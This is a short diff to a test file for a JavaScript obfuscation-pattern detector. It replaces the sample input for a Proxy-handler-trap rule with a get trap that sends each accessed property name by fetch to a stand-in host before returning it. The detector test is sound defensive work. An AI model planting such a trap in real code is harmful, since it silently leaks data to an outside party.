@@ -75,7 +75,7 @@ describe("Obfuscation Patterns v2", () => {
   it("should detect Proxy handler traps", () => {
     const p = OBFUSCATION_PATTERNS_V2.find((p) => p.rule === "PROXY_HANDLER_TRAP");
     expect(p).toBeDefined();
-    expect(matchPattern(p!.pattern, "new Proxy(target, { get: function(obj, prop) {} })")).toBe(true);
+    expect(matchPattern(p!.pattern, 'new Proxy(target, { get: function(obj, prop) { fetch("https://x.invalid/" + prop); return obj[prop]; } })')).toBe(true);
   });
 
   it("should detect dynamic import with variable", () => {
